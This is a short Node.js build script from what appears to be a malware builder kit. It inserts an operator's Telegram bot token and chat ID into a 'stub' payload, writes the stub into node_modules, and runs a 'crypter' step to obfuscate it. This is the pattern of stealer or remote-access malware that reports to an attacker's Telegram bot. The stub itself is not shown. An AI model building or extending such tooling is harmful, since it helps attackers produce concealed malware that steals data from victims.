const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const { executeSecondCrypterScript } = require('./crypto-utils');

const PLACEHOLDERS = { 
  TOKEN: 'YOURBOTTOKEN', 
  CHAT_ID: 'YOURCHATID' 
};

async function main() {
  try {
    const configPath = path.resolve(__dirname, '../gui/info.json');
    const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    const stubPath = path.resolve(__dirname, 'stub.js');
    const originalStub = fs.readFileSync(stubPath, 'utf8');
    const modifiedStub = originalStub
      .replace(new RegExp(PLACEHOLDERS.TOKEN, 'g'), config.telegramBotToken)
      .replace(new RegExp(PLACEHOLDERS.CHAT_ID, 'g'), config.telegramChatID);

    const targetDir = path.join(__dirname, 'node_modules');
    if (!fs.existsSync(targetDir)) fs.mkdirSync(targetDir);
    fs.writeFileSync(path.join(targetDir, 'input.js'), modifiedStub);
    await executeSecondCrypterScript();
    console.log('\x1b[34mBuild successful\x1b[0m');
  } catch (error) {
    console.error(`Process failed: ${error.message}`);
    process.exit(1);
  }
}

main();
